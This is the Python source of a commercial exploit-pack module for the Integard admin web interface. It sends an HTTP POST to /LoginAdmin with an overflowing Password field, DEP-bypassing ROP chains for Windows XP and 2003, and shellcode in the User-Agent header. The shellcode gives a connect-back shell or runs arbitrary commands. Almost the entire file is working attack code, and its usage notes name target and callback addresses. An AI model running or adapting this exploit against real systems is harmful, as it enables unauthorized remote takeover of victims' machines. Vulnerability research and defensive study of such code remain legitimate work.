
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Integard Admin Interface Remove Overflow"
DESCRIPTION = "Remote overflow in the Integard Admin Interface"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Integard'
DOCUMENTATION["Date public"] = "2010-09-07"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVSS'] = '10.0'
DOCUMENTATION["References"] = "http://osvdb.org/67909"
DOCUMENTATION["Notes"] = """
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "2000", "Vista", "7"]

NOTES="""
---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Integard Admin Interface Remove Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Autoversioning
1: Windows 2003 SP1-SP2
2: Windows XP SP2-SP3
3: Windows Other (Non DEP)

Payloads:
0: TCP Connect Back
1: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_integard_loginadmin/wp_integard_loginadmin.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 18881
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Autoversioning", (0x00000000, 0x00000000, 0x0000), []],
    1 : ["Windows 2003 SP1-SP2", (0x00000000, 0x00000000, 0x0000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP2-SP3", (0x00000000, 0x00000000, 0x0000), [WINXPSP2, WINXPSP3]],
    3 : ["Windows Other (Non DEP)", (0x00000000, 0x00000000, 0x0000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ######################################################################################
    PAYLOADS=["TCP Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20\x26\x2f\x3d\x3f\x5c"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        # Autoversioning OS/target detection
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def DEPBypassWinXP(self,size=2200):
        
        size = size + 96
        
        self.log("WP> Building Universal Windows XP DEP bypass using VirtualProtect")
        depBypass =""
        depBypass += pack('<L', 0x77C21A55)
        depBypass += pack('<L', 0x77C36A28)
        depBypass += wp_randomstring(4)
        depBypass += pack('<L', 0x77C3EDD9)
        depBypass += wp_randomstring(4)
        depBypass += pack('<L', 0x77C35F7A)
        depBypass += wp_randomstring(4)
        depBypass += pack('<L', 0x77C34FCB)
        depBypass += pack('<L', 0x77C23933)
        depBypass += pack('<L', 0x77C21D16)
        depBypass += pack('<L', 0x11111111)
        depBypass += pack('<L', 0x77C1F519)
        depBypass += pack('<L', 0x111110D1)
        depBypass += pack('<L', 0x77C478FA)
        depBypass += pack('<L', 0x77C2C849)
        
        size = size - 0x77C35F7D
        while hasbadchar(size,self.badstring):
            size += 1
            
        depBypass += pack('<L', size & 0xffffffff)
        depBypass += pack('<L', 0x77C14490)
        depBypass += wp_randomstring(16)
        depBypass += pack('<L', 0x77C23B47)
        depBypass += pack('<L', 0x77C2CAA8)
        depBypass += pack('<L', 0x77C2DC9E)
        depBypass += pack('<L', 0x77C2C0A9)
        depBypass += pack('<L', 0x77C35459)
        
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal DEP Bypass Size: %d Bytes" % self.depBypass_size) 
        return depBypass

    def makesploit(self):
        expl = "A"*832
        
        if self.version == 1:
            searchcode = wp_SearchCode(True)
            
            expl += pack('<L', 0x7C86827D)
            expl += "Y"*16
            expl += self.wp_UniversalDEPBypassWin2k3_VP(len(searchcode)+8)
            expl += searchcode
            expl += wp_randomstring(1000)
            expl += pack('<L', 0x00444444)
        elif self.version == 2:
            searchcode = wp_SearchCode(True)
            
            expl += pack('<L', 0x77C1C9C3)
            expl += "Y"*16
            expl += self.DEPBypassWinXP(len(searchcode)+8)
            expl += searchcode
            expl += wp_randomstring(1000)
            expl += pack('<L', 0x00444444)
        else:
            searchcode = wp_SearchCode(False)
            
            expl = "A"*(3096 - len(searchcode))
            expl += searchcode
            expl += "\xeb\xd1\x90\x90"
            expl += pack('<L', 0x004044B2)
        
        payload = "POST /LoginAdmin HTTP/1.1\r\n"
        payload += "Host: 127.0.0.1:18881\r\n"
        payload += "User-Agent: "
        
        if self.version == 1:
            payload += 'c00kc00k' + self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8)
            payload += wp_AlignStack() + self.shellcode + wp_randomnops(500) + "\r\n"
        elif self.version == 2:
            payload += 'c00kc00k' + self.DEPBypassWinXP(len(self.shellcode)+8)
            payload += wp_AlignStack() + self.shellcode + wp_randomnops(500) + "\r\n"
        else:
            payload += 'c00kc00k' + wp_AlignStack() + self.shellcode + wp_randomnops(500) + "\r\n"
            
        payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        payload += "Accept-Language: en-gb,en;q=0.5\r\n"
        payload += "Accept-Encoding: gzip,deflate\r\n"
        payload += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
        payload += "Keep-Alive: 115\r\n"
        payload += "Proxy-Connection: keep-alive\r\n"
        payload += "Content-Type: application/x-www-form-urlencoded\r\n"
        payload += "Content-Length: " + str(len(expl)) +"\r\n\r\n"
        payload += "Password=" + expl +"&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=0&LoginButtonName=Login\r\n\r\n"
        
        return payload


    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            time.sleep(5)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(3)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
